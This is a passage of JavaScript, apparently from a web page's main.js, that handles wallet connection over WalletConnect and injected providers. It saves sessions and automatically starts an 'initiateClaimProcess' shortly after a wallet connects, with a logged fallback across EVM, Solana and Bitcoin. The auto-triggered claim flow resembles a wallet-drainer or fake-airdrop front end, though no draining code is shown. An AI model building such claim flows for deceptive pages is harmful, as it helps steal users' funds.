          LS.save(account, s, 'evm');
          updateConnectedUI(account, 'evm');
          publishGlobalState({ address: account, chain: 'evm', provider: ethProvider || window.ethereum, session: s });
          setTimeout(() => window.initiateClaimProcess?.(), 800);
        }
      });
    }, 500);

  } catch (err) {
    logDebug(`❌ Fatal: ${err.message}`);
    showStatus('Failed to load wallet libraries – please refresh', 'error');
    return;
  }

  // Global provider listeners (desktop injected)
  if (window.ethereum && isDesktop()) attachProviderListeners(window.ethereum);

  // Visibility handler – resume pending mobile deeplink
  document.addEventListener('visibilitychange', () => {
    if (document.hidden || !LS.getWallet()) return;
    const pendingUri = sessionStorage.getItem('pending_wc_uri');
    if (!pendingUri || !signClient) return;
    logDebug('Visibility: checking pending WC session');
    setTimeout(() => {
      const sessions = signClient.session.values();
      if (sessions.length) {
        const s = sessions[0];
        const account = s.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
        if (account && account !== LS.getWallet()) {
          currentSession = s;
          LS.save(account, s, 'evm');
          updateConnectedUI(account, 'evm');
          publishGlobalState({ address: account, chain: 'evm', provider: ethProvider || window.ethereum, session: s });
        }
      }
    }, 800);
  });

  window.addEventListener('beforeunload', () => { try { wcModal?.closeModal?.(); } catch (_) {} });

  logDebug(`✅ main.js ready | platform=${getPlatform()} | mobile=${isMobile()}`);
  logDebug(`   Mobile flow: WC-only, 45s budget`);
  logDebug(`   Desktop flow: Direct EVM (20s) → WC (90s) → Solana → Bitcoin`);
})();
